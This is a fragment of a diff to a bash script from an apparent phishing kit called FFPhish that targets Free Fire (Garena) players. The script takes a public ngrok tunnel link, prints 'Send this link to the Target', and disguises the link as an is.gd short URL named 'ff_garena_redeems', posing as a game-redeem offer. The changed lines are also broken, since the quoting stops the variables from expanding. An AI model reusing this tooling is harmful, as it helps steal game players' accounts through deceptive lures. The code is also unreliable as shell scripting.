@@ -302,14 +302,16 @@ cd FFPhish
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target: %s\e[0m\e[1;77m %s\e[0m\n" $link
 
-send_ip=$(lynx --dump 'https://is.gd/create.php?format=simple&url=%s&shorturl=ff_garena_redeems' $link)
+link2=$'https://is.gd/create.php?format=simple&url=$link&shorturl=ff_garena_redeems'
+
+send_ip=$(lynx --dump '$link2')
 #send_ip=$'https://is.gd/ff_garena_redeems'
 
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using shortenurl (is.gd):\e[0m\e[1;70m %s \n' $send_ip
 printf "\n"
 
-termux-clipboard-set $link
-termux-clipboard-set $send_ip
+#termux-clipboard-set $link
+#termux-clipboard-set $send_ip
 checkfound
 }
 
